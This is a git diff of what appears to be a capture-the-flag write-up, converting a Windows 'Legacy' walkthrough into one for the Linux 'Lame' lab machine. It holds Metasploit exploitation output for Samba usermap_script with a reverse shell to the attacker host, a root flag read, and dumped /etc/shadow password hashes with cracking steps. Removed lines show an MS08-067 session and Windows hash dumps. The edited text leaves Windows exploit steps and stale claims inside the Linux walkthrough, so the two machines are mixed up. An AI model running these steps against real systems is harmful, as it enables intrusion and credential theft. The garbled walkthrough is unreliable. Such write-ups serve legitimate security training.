@@ -105,50 +105,80 @@ As the SMB service was doscovered, we initiated the explotation with SMB Client 
 **Tool:** smbclient
 
 ~~~bash
-smbclient -L 10.10.10.4
+Hackden> ~ smbclient -L \\\\10.10.10.3\\
+Enter WORKGROUP\danny's password: 
+Anonymous login successful
 
-Hackden> ~ smbclient -L 10.10.10.4
-protocol negotiation failed: NT_STATUS_IO_TIMEOUT
-Hackden> ~ smbclient -L 10.10.10.4
-protocol negotiation failed: NT_STATUS_IO_TIMEOUT
-Hackden> ~ 
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            LAME
 ~~~
 
-smbclient failed to connect so we move on to metasploit using a well known exploit
+Anonymous logins were allowed and we were able to connect with smbclient with *anonymous* as username and a blank password. It shows us the shares that are availabe via SMB share but not the way to access them as anonymous user does not have permission to access them. Only listing is allowed. To exploit, an exploit is avalibe on Rapid7 Website
 
 **Tool:** Metasploit
+[Samba Usermap Script Exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)
 
-1. Enumerate using the scanner module
+1. Exploitation using the above exploit
+
 ~~~bash
-msf5 > use auxiliary/scanner/smb/smb_version 
-msf5 auxiliary(scanner/smb/smb_version) > options
 
-Module options (auxiliary/scanner/smb/smb_version):
+msf5 > use exploit/multi/samba/usermap_script 
+msf5 exploit(multi/samba/usermap_script) > show options
 
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   SMBDomain  .                no        The Windows domain to use for authentication
-   SMBPass                     no        The password for the specified username
-   SMBUser                     no        The username to authenticate as
-   THREADS    1                yes       The number of concurrent threads (max one per host)
+Module options (exploit/multi/samba/usermap_script):
 
-msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.4
-RHOSTS => 10.10.10.4
-msf5 auxiliary(scanner/smb/smb_version) > run
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
 
-[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
-[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 10.10.14.56:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo elbi8UhZCnSDUiWF;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "elbi8UhZCnSDUiWF\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.56:4444 -> 10.10.10.3:34811) at 2020-04-18 15:29:34 +0500
 ~~~
 
-This gives us the operatin gsystem and the workgroup name and confirms that SMB service is infact running. This information can be used for further exploitation. But it does not gives us the version so we can use operating system information to search for exploit online.
+This gives us the operating system and the workgroup name and confirms that SMB service is infact running. This information can be used for further exploitation. But it does not gives us the version so we can use operating system information to search for exploit online.
 
 [SMB NetAPI Exploit on Rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)
 
-Target is to gain *NT AUTHORITY\SYSTEM* which is equivalent to root on linux
+Target is to gain *root* level access
 
-2. Using the exploit
+2.Using the exploit
 
 ~~~bash
 msf5 > use exploit/windows/smb/ms08_067_netapi
@@ -185,40 +215,175 @@ msf5 exploit(windows/smb/ms08_067_netapi) > run
 
 ~~~
 
-Using the exploit gave us a meterpreter session with the right privileges as can be seen below
+Using the exploit gave us a meterpreter session but with root privileges 
 
 ~~~bash
-meterpreter > dir
-Listing: C:\Documents and Settings\Administrator\Desktop
-========================================================
+whoami
+root
 
-Mode              Size  Type  Last modified              Name
-----              ----  ----  -------------              ----
-100666/rw-rw-rw-  32    fil   2017-03-16 11:18:19 +0500  root.txt
+hostname
+lame
 
-meterpreter > cat root.txt
-993442d258b0e0ec917cae9e695d5713meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-meterpreter > sysinfo
-Computer        : LEGACY
-OS              : Windows XP (5.1 Build 2600, Service Pack 3).
-Architecture    : x86
-System Language : en_US
-Domain          : HTB
-Logged On Users : 1
-Meterpreter     : x86/windows
-meterpreter > help
+pwd
+/
+ls 
 
+cd home	
+ls
+cd ..
+
+cd root
+ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+
+cat root.txt
+92caac3be140ef409e45721348a4e9df
 ~~~
 
-Using this authority we can use the hashdum command to dump the SAM Hashses and use them to exploit the system further but we already have the authority hence the machine is wxploited successfully
+## Post Exploitation
+
+1. Grab hashes (passwd + shadwo file) from /etc/passwd & /etx/shadow
+
+2. Using unshadow tool we can make a single file from passwd + Shadow file
 
 ~~~bash
-meterpreter > hashdump
-Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
-john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
-SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::
+unshadow <PASSWD FILE> <SHADOW FILE>
 ~~~
 
+3. Using hashcat we can decrypt these hashes for password
+
+<details>
+   <summary>/etc/passwd Hashes</summary>
+
+   ~~~bash
+   root:x:0:0:root:/root:/bin/bash
+   daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+   bin:x:2:2:bin:/bin:/bin/sh
+   sys:x:3:3:sys:/dev:/bin/sh
+   sync:x:4:65534:sync:/bin:/bin/sync
+   games:x:5:60:games:/usr/games:/bin/sh
+   man:x:6:12:man:/var/cache/man:/bin/sh
+   lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+   mail:x:8:8:mail:/var/mail:/bin/sh
+   news:x:9:9:news:/var/spool/news:/bin/sh
+   uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+   proxy:x:13:13:proxy:/bin:/bin/sh
+   www-data:x:33:33:www-data:/var/www:/bin/sh
+   backup:x:34:34:backup:/var/backups:/bin/sh
+   list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+   irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+   nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+   libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+   dhcp:x:101:102::/nonexistent:/bin/false
+   syslog:x:102:103::/home/syslog:/bin/false
+   klog:x:103:104::/home/klog:/bin/false
+   sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+   bind:x:105:113::/var/cache/bind:/bin/false
+   postfix:x:106:115::/var/spool/postfix:/bin/false
+   ftp:x:107:65534::/home/ftp:/bin/false
+   postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+   mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+   tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+   distccd:x:111:65534::/:/bin/false
+   service:x:1002:1002:,,,:/home/service:/bin/bash
+   telnetd:x:112:120::/nonexistent:/bin/false
+   proftpd:x:113:65534::/var/run/proftpd:/bin/false
+   statd:x:114:65534::/var/lib/nfs:/bin/false
+   snmp:x:115:65534::/var/lib/snmp:/bin/false
+   makis:x:1003:1003::/home/makis:/bin/sh
+   ~~~
+
+</details>
+
+<details>
+   <summary>/etc/shadow</summary>
+
+   ~~~bash
+root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+snmp:*:15480:0:99999:7:::
+makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::
+   ~~~
+
+</details>
+
+
+<details>
+   <summary>Unshadow Command Output</summary>
+
+   ~~~bash
+root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/bin/sh
+bin:*:2:2:bin:/bin:/bin/sh
+sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:3:3:sys:/dev:/bin/sh
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/bin/sh
+man:*:6:12:man:/var/cache/man:/bin/sh
+lp:*:7:7:lp:/var/spool/lpd:/bin/sh
+mail:*:8:8:mail:/var/mail:/bin/sh
+news:*:9:9:news:/var/spool/news:/bin/sh
+uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:*:13:13:proxy:/bin:/bin/sh
+www-data:*:33:33:www-data:/var/www:/bin/sh
+backup:*:34:34:backup:/var/backups:/bin/sh
+list:*:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:*:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:!:100:101::/var/lib/libuuid:/bin/sh
+dhcp:*:101:102::/nonexistent:/bin/false
+syslog:*:102:103::/home/syslog:/bin/false
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
+bind:*:105:113::/var/cache/bind:/bin/false
+postfix:*:106:115::/var/spool/postfix:/bin/false
+ftp:*:107:65534::/home/ftp:/bin/false
+postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:*:111:65534::/:/bin/false
+service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:1002:1002:,,,:/home/service:/bin/bash
+telnetd:*:112:120::/nonexistent:/bin/false
+proftpd:!:113:65534::/var/run/proftpd:/bin/false
+statd:*:114:65534::/var/lib/nfs:/bin/false
+snmp:*:115:65534::/var/lib/snmp:/bin/false
+makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:1003:1003::/home/makis:/bin/sh
+   ~~~
+
+</details>
